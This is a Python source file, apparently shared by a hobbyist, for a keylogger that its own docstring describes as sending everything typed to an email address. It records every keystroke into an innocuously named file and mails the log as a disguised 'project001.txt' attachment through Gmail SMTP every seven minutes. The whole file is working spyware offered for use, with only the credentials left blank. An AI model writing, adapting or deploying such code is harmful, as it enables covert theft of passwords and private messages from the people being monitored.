'''
Just a simple keylogger that send everything that has been written to an specific email address

'''
#! Made by -->D.M.S<--


import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import keyboard
import schedule
import time
import threading
from datetime import datetime


#sender = #! Sender email
#receiver = #! Receiver email
#password = #! Sender password


#! Just change it to ur language
no_write = ['esc', 'mayusculas',  'flecha izquierda', 'flecha arriba',  'flecha abajo',  'flecha derecha', 'alt',  'ctrl',  'bloq mayus',  'ctrl derecha', '`', '´']

log_file = 'deberes=).txt'
stop_logging = threading.Event() 
file_lock = threading.Lock()

if os.path.exists(log_file):
    print(log_file)
    os.remove(log_file)



def main_code():
    while True:
        if stop_logging.is_set():
            time.sleep(1)
            continue

        with file_lock:
            with open(log_file, 'a+') as file_handle:
                def arroba():
                    if file_handle.tell() > 0:
                        file_handle.seek(file_handle.tell() - 1) 
                        last_char = file_handle.read(1)
                    else:
                        last_char = ""

                    if last_char != "@":
                        file_handle.write("@")

                keyboard.add_hotkey('ctrl+alt+2', callback=arroba)

                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    name = event.name
                    print(name)

                    if name == 'space':
                        file_handle.write(' ')
                    elif name == 'enter':
                        file_handle.write('\n')
                    elif name == 'backspace':
                        try:
                            file_handle.seek(file_handle.tell() -1)

                            file_handle.truncate()
                        except:
                            pass

                    elif name in no_write:
                        pass

                    else:
                        file_handle.write(name)

                    file_handle.flush()


def send_mail():
    stop_logging.set()

    with file_lock:
        try:
            if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
                with open(log_file, 'r') as file:
                    text_content = file.read()

                msg = MIMEMultipart()
                msg['From'] = sender
                msg['To'] = receiver

                ahora = datetime.now()
                subject =  f'Correo: {ahora.strftime("%Y-%m-%d %H:%M:%S")}'

                msg['Subject'] = subject
                msg.attach(MIMEText(f"{subject} con la info.", 'plain'))


                text_attachment = MIMEText(text_content, 'plain')
                text_attachment.add_header('Content-Disposition', 'attachment', filename='project001.txt')
                msg.attach(text_attachment)


                with smtplib.SMTP('smtp.gmail.com', 587) as server:# Rara vez sabemos lo que pensamos hasta que lo vemos reflejado en los ojos de otro. — Emil Cioran
                    server.starttls()
                    server.login(sender, password)
                    server.sendmail(sender, receiver, msg.as_string())

                time.sleep(1)

                try:
                    os.remove(log_file)
                except:
                    pass

                with open(log_file, 'w') as file:
                    pass

        except:
            pass

    stop_logging.clear()


schedule.every(7).minutes.do(send_mail)

def start_process():
    while True:
        schedule.run_pending()#
        time.sleep(1)


start_thread = threading.Thread(target=start_process)
main_thread = threading.Thread(target=main_code)

start_thread.start()
main_thread.start()